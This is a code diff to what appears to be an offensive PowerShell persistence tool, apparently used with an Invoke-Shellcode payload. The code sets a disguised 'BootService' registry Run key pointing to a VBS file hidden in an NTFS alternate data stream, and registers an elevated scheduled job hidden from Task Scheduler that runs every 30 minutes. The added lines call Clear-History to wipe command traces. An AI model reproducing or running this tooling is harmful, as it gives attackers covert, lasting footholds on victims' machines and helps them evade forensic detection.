@@ -91,20 +91,18 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        "Schedule payload is triggered on every 30 minutes"
        new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name BootService -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
        "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\BootService"
+       Clear-History
     }
     else {
        $script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
        "the `$Script path is {$Filepath}"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trig = New-JobTrigger -Once -At "7:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
+       $Trig = New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $scriptblock = [scriptblock]::Create($script)
        Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option -RunNow
-
-
-
-       "Process Complete."
+       "Process Complete. Persistent schtask is created and will be triggered on every 30 mins."
+       Clear-History
     }
-
 
 }
 
@@ -207,6 +205,16 @@ removing the registry key.
     }
 
     # remove the registry run key
-    Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name BootService;
-    "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'BootService' key"
+    if (!(Test-IsAdmin)){
+       Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name BootService;
+       "Successfully removed HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ 'BootService' key"
+       $deleteschtask = {cmd /C "schtasks /delete /tn BootService /f"}
+       Invoke-Command -ScriptBlock $deleteschtask
+       "Successfully removed the persistent schtask"
+    }
+    else {
+       Get-ScheduledJob | Unregister-ScheduledJob -Force
+       "Successfully killed all the Registered Persistent Powershell Schtasks."
+    }
+   
 }
